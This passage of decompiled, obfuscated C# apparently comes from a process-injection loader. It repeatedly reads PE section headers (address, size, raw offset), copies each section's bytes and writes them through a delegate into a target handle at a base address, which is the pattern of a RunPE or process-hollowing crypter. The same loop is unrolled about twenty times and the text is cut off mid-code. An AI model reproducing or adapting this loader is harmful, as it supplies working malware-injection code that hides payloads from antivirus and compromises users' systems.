						((byte*)ptr)[4331] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2928))), array243, array243.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4331] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4335] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4335] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2940)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2944)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2948)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4333] = ((*(int*)((byte*)ptr + 2944) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4333] != 0)
					{
						byte[] array244;
						checked
						{
							array244 = new byte[*unchecked((int*)((byte*)ptr + 2944)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2948), array244, 0, array244.Length);
						((byte*)ptr)[4334] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2940))), array244, array244.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4334] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4338] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4338] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2952)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2956)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2960)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4336] = ((*(int*)((byte*)ptr + 2956) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4336] != 0)
					{
						byte[] array245;
						checked
						{
							array245 = new byte[*unchecked((int*)((byte*)ptr + 2956)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2960), array245, 0, array245.Length);
						((byte*)ptr)[4337] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2952))), array245, array245.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4337] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4341] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4341] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2964)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2968)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2972)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4339] = ((*(int*)((byte*)ptr + 2968) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4339] != 0)
					{
						byte[] array246;
						checked
						{
							array246 = new byte[*unchecked((int*)((byte*)ptr + 2968)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2972), array246, 0, array246.Length);
						((byte*)ptr)[4340] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2964))), array246, array246.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4340] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4344] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4344] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2976)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2980)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2984)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4342] = ((*(int*)((byte*)ptr + 2980) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4342] != 0)
					{
						byte[] array247;
						checked
						{
							array247 = new byte[*unchecked((int*)((byte*)ptr + 2980)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2984), array247, 0, array247.Length);
						((byte*)ptr)[4343] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2976))), array247, array247.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4343] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4347] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4347] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2988)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2992)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2996)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4345] = ((*(int*)((byte*)ptr + 2992) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4345] != 0)
					{
						byte[] array248;
						checked
						{
							array248 = new byte[*unchecked((int*)((byte*)ptr + 2992)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2996), array248, 0, array248.Length);
						((byte*)ptr)[4346] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2988))), array248, array248.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4346] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4350] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4350] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3000)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3004)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3008)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4348] = ((*(int*)((byte*)ptr + 3004) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4348] != 0)
					{
						byte[] array249;
						checked
						{
							array249 = new byte[*unchecked((int*)((byte*)ptr + 3004)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3008), array249, 0, array249.Length);
						((byte*)ptr)[4349] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3000))), array249, array249.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4349] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4353] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4353] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3012)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3016)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3020)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4351] = ((*(int*)((byte*)ptr + 3016) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4351] != 0)
					{
						byte[] array250;
						checked
						{
							array250 = new byte[*unchecked((int*)((byte*)ptr + 3016)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3020), array250, 0, array250.Length);
						((byte*)ptr)[4352] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3012))), array250, array250.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4352] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4356] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4356] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3024)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3028)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3032)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4354] = ((*(int*)((byte*)ptr + 3028) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4354] != 0)
					{
						byte[] array251;
						checked
						{
							array251 = new byte[*unchecked((int*)((byte*)ptr + 3028)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3032), array251, 0, array251.Length);
						((byte*)ptr)[4355] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3024))), array251, array251.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4355] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4359] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4359] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3036)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3040)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3044)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4357] = ((*(int*)((byte*)ptr + 3040) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4357] != 0)
					{
						byte[] array252;
						checked
						{
							array252 = new byte[*unchecked((int*)((byte*)ptr + 3040)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3044), array252, 0, array252.Length);
						((byte*)ptr)[4358] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3036))), array252, array252.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4358] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4362] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4362] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3048)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3052)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3056)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4360] = ((*(int*)((byte*)ptr + 3052) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4360] != 0)
					{
						byte[] array253;
						checked
						{
							array253 = new byte[*unchecked((int*)((byte*)ptr + 3052)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3056), array253, 0, array253.Length);
						((byte*)ptr)[4361] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3048))), array253, array253.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4361] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4365] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4365] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3060)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3064)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3068)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4363] = ((*(int*)((byte*)ptr + 3064) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4363] != 0)
					{
						byte[] array254;
						checked
						{
							array254 = new byte[*unchecked((int*)((byte*)ptr + 3064)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3068), array254, 0, array254.Length);
						((byte*)ptr)[4364] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3060))), array254, array254.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4364] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4368] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4368] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3072)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3076)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3080)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4366] = ((*(int*)((byte*)ptr + 3076) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4366] != 0)
					{
						byte[] array255;
						checked
						{
							array255 = new byte[*unchecked((int*)((byte*)ptr + 3076)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3080), array255, 0, array255.Length);
						((byte*)ptr)[4367] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3072))), array255, array255.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4367] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4371] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4371] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3084)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3088)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3092)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4369] = ((*(int*)((byte*)ptr + 3088) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4369] != 0)
					{
						byte[] array256;
						checked
						{
							array256 = new byte[*unchecked((int*)((byte*)ptr + 3088)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3092), array256, 0, array256.Length);
						((byte*)ptr)[4370] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3084))), array256, array256.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4370] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4374] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4374] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3096)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3100)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3104)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4372] = ((*(int*)((byte*)ptr + 3100) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4372] != 0)
					{
						byte[] array257;
						checked
						{
							array257 = new byte[*unchecked((int*)((byte*)ptr + 3100)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3104), array257, 0, array257.Length);
						((byte*)ptr)[4373] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3096))), array257, array257.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4373] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4377] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4377] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3108)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3112)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3116)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4375] = ((*(int*)((byte*)ptr + 3112) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4375] != 0)
					{
						byte[] array258;
						checked
						{
							array258 = new byte[*unchecked((int*)((byte*)ptr + 3112)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3116), array258, 0, array258.Length);
						((byte*)ptr)[4376] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3108))), array258, array258.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4376] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4380] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4380] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3120)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3124)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3128)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4378] = ((*(int*)((byte*)ptr + 3124) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4378] != 0)
					{
						byte[] array259;
						checked
						{
							array259 = new byte[*unchecked((int*)((byte*)ptr + 3124)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3128), array259, 0, array259.Length);
						((byte*)ptr)[4379] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3120))), array259, array259.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4379] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4383] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4383] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3132)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3136)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3140)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4381] = ((*(int*)((byte*)ptr + 3136) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4381] != 0)
					{
						byte[] array260;
						checked
						{
							array260 = new byte[*unchecked((int*)((byte*)ptr + 3136)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3140), array260, 0, array260.Length);
						((byte*)ptr)[4382] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3132))), array260, array260.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4382] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4386] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4386] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3144)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3148)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3152)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4384] = ((*(int*)((byte*)ptr + 3148) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4384] != 0)
					{
						byte[] array261;
						checked
						{
							array261 = new byte[*unchecked((int*)((byte*)ptr + 3148)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3152), array261, 0, array261.Length);
						((byte*)ptr)[4385] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3144))), array261, array261.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4385] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4389] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4389] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3156)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3160)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3164)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4387] = ((*(int*)((byte*)ptr + 3160) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4387] != 0)
					{
						byte[] array262;
						checked
						{
							array262 = new byte[*unchecked((int*)((byte*)ptr + 3160)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3164), array262, 0, array262.Length);
						((byte*)ptr)[4388] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3156))), array262, array262.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4388] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
